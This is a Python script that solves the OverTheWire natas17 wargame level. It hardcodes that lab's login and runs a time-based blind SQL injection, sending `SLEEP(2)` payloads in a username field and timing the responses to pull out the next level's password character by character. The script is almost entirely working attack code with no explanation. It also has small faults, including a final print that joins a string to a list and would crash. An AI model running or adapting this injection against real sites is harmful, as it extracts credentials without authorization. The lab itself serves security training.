# Code inspiration from here: https://medium.com/@samarthkokil64/overthewire-updated-natas-walkthrough-level-17-00dd519c7689
import requests, string
from time import *

AUTH=requests.auth.HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
URL = "http://natas17.natas.labs.overthewire.org"
ALLCHARS = string.ascii_letters + string.digits
PASSWORD_LEN = 32
chars = ''
passwd = ''

Url = "http://natas17.natas.labs.overthewire.org"

session = requests.session()

for c in ALLCHARS:
  print("Trying with character " + c)
  startTime = time()
  response = session.post(Url, data={"username": 'natas18" AND password LIKE BINARY "%' + c + '%" AND SLEEP(2) #'},auth=AUTH)
  endTime = time()

  if endTime - startTime > 2:  
    chars += c
    print("Found new character " + c + ", new list is " + chars + "\n")

print("\nFinished finding all characters: " + chars)
print("Brute forcing password...")

current_password = list()

while(True):
  for c in chars:
    print("Trying with password: " + "".join(current_password) + c)
    startTime = time()
    response = session.post(Url, data={"username": 'natas18" AND password LIKE BINARY "' + "".join(current_password) + c + '%" AND SLEEP(2) #'},auth=AUTH)
    endTime = time()

    if endTime - startTime > 2:
      print("Found new match of lenth: " + str(len(current_password)) + "".join(current_password))
      current_password.append(c)
      break

  if len(current_password) == PASSWORD_LEN:
    print("Final password: " + current_password)
    break